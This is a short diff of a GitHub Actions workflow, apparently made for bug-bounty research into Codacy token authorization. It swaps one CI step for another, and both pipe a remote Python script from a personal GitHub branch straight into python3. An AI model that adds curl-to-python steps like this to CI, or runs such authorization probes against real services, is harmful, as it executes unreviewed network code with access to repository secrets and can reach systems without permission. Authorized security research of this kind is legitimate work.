@@ -12,5 +12,5 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 3
     steps:
-      - name: Audit Codacy source map for authorization clues
-        run: curl -fsSL https://raw.githubusercontent.com/Vincx12/Potasse/codacy-h1-safe-probe-20260710/.github/scripts/codacy_sourcemap_probe.py | python3
+      - name: Test unauthenticated repository-token authorization on researcher-owned repositories
+        run: curl -fsSL https://raw.githubusercontent.com/Vincx12/Potasse/codacy-h1-safe-probe-20260710/.github/scripts/codacy_probe.py | python3
